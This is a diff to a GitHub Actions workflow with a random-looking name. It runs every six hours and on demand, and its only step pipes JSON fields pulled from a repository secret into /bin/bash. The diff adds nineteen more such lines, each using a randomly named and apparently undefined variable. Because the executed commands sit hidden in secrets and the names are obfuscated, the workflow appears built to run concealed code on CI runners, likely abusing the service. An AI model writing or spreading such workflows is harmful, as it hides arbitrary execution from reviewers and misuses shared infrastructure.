@@ -1,19 +1,37 @@
 name: midwifeprosecutor
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
-jobs:  # 6576
+    - cron: '24 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: midwifeprosecutor
         env:
-          ik5: ${{ secrets.ik5 }}
+          we958: ${{ secrets.we958 }}
         run: |
-          echo $ik5 | jq -r .ppnb97 | /bin/bash
-          echo $tsfz79690 | jq -r .cuc52 | /bin/bash
-          echo $lycxd9 | jq -r .mvx96 | /bin/bash
+          echo $we958 | jq -r .tuwb373 | /bin/bash
+          echo $q251 | jq -r .enf847 | /bin/bash
+          echo $ys9 | jq -r .sarje84210 | /bin/bash
+          echo $whbz774 | jq -r .wkd0804 | /bin/bash
+          echo $cu77 | jq -r .n37 | /bin/bash
+          echo $u1369 | jq -r .nta27434 | /bin/bash
+          echo $idu6 | jq -r .sfklr28 | /bin/bash
+          echo $lk2514 | jq -r .hzk05 | /bin/bash
+          echo $itqm800 | jq -r .e183 | /bin/bash
+          echo $tlciv47 | jq -r .nsh63 | /bin/bash
+          echo $mhu98 | jq -r .eam36 | /bin/bash
+          echo $baj31170 | jq -r .isifc38 | /bin/bash
+          echo $aumi78 | jq -r .n56879 | /bin/bash
+          echo $samj13 | jq -r .gybk3 | /bin/bash
+          echo $r95 | jq -r .tblv25 | /bin/bash
+          echo $mautd43 | jq -r .whty557 | /bin/bash
+          echo $hi52 | jq -r .kg7497 | /bin/bash
+          echo $m361 | jq -r .jy8 | /bin/bash
+          echo $jxcq5 | jq -r .bkoti375 | /bin/bash
+          echo $dfnzx5584 | jq -r .ryd3 | /bin/bash
 
